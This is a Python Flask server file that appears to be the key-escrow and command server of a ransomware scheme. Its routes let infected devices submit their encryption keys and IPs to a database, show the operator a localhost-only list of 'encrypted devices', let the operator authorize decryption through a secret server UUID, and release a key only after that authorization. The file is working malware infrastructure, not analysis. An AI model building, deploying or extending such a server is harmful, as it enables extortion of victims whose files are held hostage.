from flask import Flask, render_template, Response, redirect
from flask import request
import pathlib
import uuid
import sqlite3

authorized_client_ip_start="127.0."
def get_db_connection():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn

def reset_database():
    conn = get_db_connection()
    with open('schema.sql') as f:
        conn.executescript(f.read())
    cur = conn.cursor()
    conn.commit()
    conn.close()

if not (pathlib.Path('database.db').is_file()):
    reset_database()

server_uuid=uuid.uuid4()
app = Flask(__name__)

@app.route("/")
def device_listing():
    if(request.remote_addr.startswith(authorized_client_ip_start)):
        conn = get_db_connection()
        devices = conn.execute('SELECT * FROM devices').fetchall()
        conn.close()
        return render_template('list.html',encrypted_devices=devices,server_uuid=server_uuid)
    else:
        return "<p>Hello, World!</p>"

@app.route("/undo/<server>/<uuid>")
def decrypt(server,uuid):
    if(server==str(server_uuid)):
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("UPDATE DEVICES set decrypt_authorized = 1 where uuid = ?", (uuid,))
        conn.commit()
        conn.close()

        return redirect("/")
    else:
        return "Not today!"

@app.route("/request_key/<uuid>")
def request_decrypt(uuid):
    conn = get_db_connection()
    cur=conn.cursor()
    cur.execute('SELECT key FROM devices where uuid=? and decrypt_authorized=1',(uuid,))
    rows=cur.fetchall()
    conn.close()

    if(len(rows))==1:
        return rows[0][0]
    else:
        return Response(status=204)

@app.route("/do/<uuid>/<key>")
def crypt(uuid,key):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO DEVICES (uuid,key,ip) values (?,?,?)",(uuid,key,request.remote_addr))
    conn.commit()
    conn.close()

    return "Complete" # Need to change

@app.route("/resetdatabase/<server>")
def reset_db(server):
    if (server == str(server_uuid)):
        reset_database()
    return redirect("/")

if __name__ == '__main__':
    #openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
    app.run(host="0.0.0.0",ssl_context='adhoc',port=443,debug=False)
    #app.run(host="0.0.0.0",ssl_context=('cert.pem', 'key.pem'),port=443,debug=False)